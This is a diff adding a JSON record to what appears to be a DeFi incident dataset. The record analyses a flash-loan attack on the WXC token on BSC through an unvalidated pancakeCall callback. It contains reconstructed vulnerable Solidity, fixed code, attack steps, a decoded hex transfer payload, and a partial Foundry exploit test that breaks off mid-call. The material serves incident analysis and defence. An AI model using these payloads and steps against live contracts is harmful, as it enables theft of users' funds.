@@ -1,0 +1,37 @@
+{
+ "id": "2025__2025-08-01_WXC_Token_MoolahFlashLoanCallback",
+ "source_file": "2025/2025-08-01_WXC_Token_MoolahFlashLoanCallback.md",
+ "title": "WXC Token — Moolah Flash Loan + Swap Callback Manipulation Analysis",
+ "date": "2025-08-01",
+ "protocol": "WXC Token",
+ "chain": "BSC",
+ "loss_raw": "~37.5 WBNB",
+ "loss_usd": null,
+ "root_cause": "PancakePair swap callback (`pancakeCall`) allows arbitrary token movement via encoded payload",
+ "attack_tx": "0x1397bc7f",
+ "vulnerable_contract": "0x8087720eeea59f9f04787065447d52150c09643e",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable logic: pancakeCall executes data payload without validation\ncontract WXCToken {\n    function pancakeCall(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external {\n        // No msg.sender validation — anyone can call\n        // Parses data payload and executes token transfer\n        (address target, bytes memory call) = abi.decode(data, (address, bytes));\n        //",
+  "❌ target and call contents are not validated\n        (bool success,) = target.call(call);\n        require(success);\n    }\n}\n\n//",
+  "// Reconstructed from WXC_Token_exp.sol PoC — NOT verified source\n\n// ❌ pancakeCall (or equivalent callback): parses attacker-controlled `data` and executes token transfers\nfunction pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n) external {\n    // ❌ No validation that msg.sender is the legitimate Cake_LP pair\n    // ❌ No validation that `sender` is this contract itself (self-initiated swap only)\n    // ❌ Decodes and executes arbitrary encoded commands from `data`\n    // The crafted payload encodes:\n    //   WBNB address + routing flags + transfer(attacker, 74963130190599057252979324 WXC)\n    _executePayload(data); // ❌ moves WXC tokens according to caller-supplied payload\n}\n\n// Crafted hex payload decoded (from PoC):\n// hex\"000000000014\n//     bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c  <- WBNB address\n//     03 00000006 000000000000cf38 00000044\n//     a9059cbb                                  <- transfer(address,uint256) selector\n//     000000000000000000000000da5c7ea4458ee9c5484fa00f2b8c933393bac965  <- attacker address\n//     000000000000000000000002aa17e09796730000  <- large WXC amount\n//     000000000000000000000000006f0ae91d\"       <- deadline / trailing param"
+ ],
+ "code_after": [
+  "✅ Fix: caller validation and whitelist of allowed operations\nfunction pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n    require(msg.sender == address(Cake_LP), \"Not authorized pair\");\n    require(sender == address(this), \"Not self-initiated\");\n    // data only executes internally defined repayment logic\n    _repayFlashSwap(amount0, amount1);\n}",
+  "// ✅ Fix: validate caller and initiator inside the callback\nfunction pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n    require(msg.sender == address(Cake_LP), \"pancakeCall: unauthorized pair\");\n    require(sender == address(this), \"pancakeCall: not self-initiated\");\n    // Only execute hard-coded repayment logic — never forward arbitrary data\n    _repayFlashSwap(amount0, amount1);\n}"
+ ],
+ "steps": [
+  "1 ▶ WBNB.approve(ercproxy, max)",
+  "2 ▶ ERC1967Proxy.flashLoan(WBNB, 49.15 WBNB)",
+  "3 ▶ Cake_LP.swap(74,963,130...WXC, 1 BUSD, attacker, payload)",
+  "4 ▶ pancakeCall callback: payload executed → large WXC drained",
+  "5 ▶ WXC → WBNB swap (PancakeRouter)",
+  "6 ▶ ERC1967Proxy: WBNB repaid + ~37.5 WBNB profit retained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─1─▶ WBNB.approve(ercproxy, max)\n  │\n  ├─2─▶ ERC1967Proxy.flashLoan(WBNB, 49.15 WBNB)\n  │         [onMoolahFlashLoan callback]\n  │\n  ├─3─▶ Cake_LP.swap(74,963,130...WXC, 1 BUSD, attacker, payload)\n  │         └─ Crafted payload: WXC.transfer(attacker, large amount)\n  │\n  ├─4─▶ pancakeCall callback: payload executed → large WXC drained\n  │\n  ├─5─▶ WXC → WBNB swap (PancakeRouter)\n  │         └─ Large WXC amount exchanged for WBNB\n  │\n  └─6─▶ ERC1967Proxy: WBNB repaid + ~37.5 WBNB profit retained",
+  "contract WXC is BaseTestWithBalanceLog {\n    function testExploit() public balanceLog {\n        WXC.approve(address(Router), type(uint256).max);\n        WBNB.approve(address(ercproxy), type(uint256).max);\n\n        // Flash loan 49.15 WBNB from Moolah ERC1967Proxy\n        ercproxy.flashLoan(address(WBNB), flashAmount, \"0x00\");\n    }\n\n    function onMoolahFlashLoan(uint256 assets, bytes memory data) public {\n        WBNB.approve(address(ercproxy), flashAmount);\n\n        // Call PancakePair swap with crafted payload\n        // payload: encodes a large transfer command against WXC contract\n        uint256 amt0 = 74963130190599057252979324; // Large WXC amount requested\n        Cake_LP.swap(amt0, 1, address(this),\n            // payload encodes WXC.transfer(this, amt0) + WBNB-related commands\n "
+ ]
+}
